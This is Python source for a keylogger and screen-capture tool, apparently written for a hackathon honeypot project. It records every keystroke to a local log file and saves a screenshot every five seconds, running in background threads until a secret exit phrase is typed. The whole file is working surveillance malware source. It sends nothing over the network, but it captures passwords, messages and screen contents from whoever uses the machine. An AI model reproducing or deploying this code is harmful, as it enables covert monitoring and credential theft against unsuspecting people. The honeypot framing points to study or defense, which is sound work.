from mss import mss                      
from threading import Timer, Thread     
import time                              
import os                               
from pynput.keyboard import Listener  # Ensure to import the Listener for key logging

count = 0
keys = []                               # List for all pressed keys
exit_sequence = "dhyaneswaran"              # Sequence to stop the program
typed_sequence = []                     # Track recent key presses


class IntervalTimer(Timer):             # Control the interval between each screenshot
    def run(self):
        while not self.finished.wait(self.interval):
            if self.finished.is_set():  # Check if Timer is canceled
                break
            self.function(*self.args, **self.kwargs)


def write_file(keys):                  # Write keys to file
    with open("C:/hackathonallprojects/Honeypot-Implementation-master/log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:      # Replace Key_Space with " " in the main file
                f.write(" ")
            if k.find("enter") > 0:      # Replace Key_Enter with "\n or nextline"
                f.write("\n")
            elif k.find("Key") == -1:   
                f.write(k)


class KeyloggerMain:

    def _build_logs(self):             # Create directory for screenshots and log files 
        if not os.path.exists('C:/hackathonallprojects/Honeypot-Implementation-master/images/'):
            os.makedirs('C:/hackathonallprojects/Honeypot-Implementation-master/images')
    
    def _on_press(self, k):            # Track pressed keys
        global keys, count, typed_sequence
        keys.append(k)
        count += 1

        # Track the last few keys typed
        k_str = str(k).replace("'", "")
        if k_str.find("Key") == -1:  # Ignore special keys
            typed_sequence.append(k_str)
            if len(typed_sequence) > len(exit_sequence):
                typed_sequence.pop(0)  # Keep only the last characters as long as the exit_sequence

        # Check if the exit sequence has been typed
        if ''.join(typed_sequence) == exit_sequence:
            print("Exit sequence detected. Stopping the program.")
            os._exit(0)  # Immediately terminate the program

        if count >= 10:
            count = 0
            write_file(keys)
            keys = []

    def _keylogger(self):              # Start key tracker
        with Listener(on_press=self._on_press) as listener:
            listener.join()
            
    def _screenshot(self):             # Start screenshot tracker
        sct = mss()
        while True:
            sct.shot(output='C:/hackathonallprojects/Honeypot-Implementation-master/images/{}.png'.format(time.time()))
            time.sleep(5)

    def run(self, interval):           # Start keylogger and screenshot taker
        self._build_logs()
        Thread(target=self._keylogger, daemon=True).start()   # Run key and screenshot tracker in parallel
        IntervalTimer(interval, self._screenshot).start()


# Main Execution
km = KeyloggerMain()
km.run(5)  # Interval between each screenshot
while True:
    time.sleep(1)  # Keep the main thread running
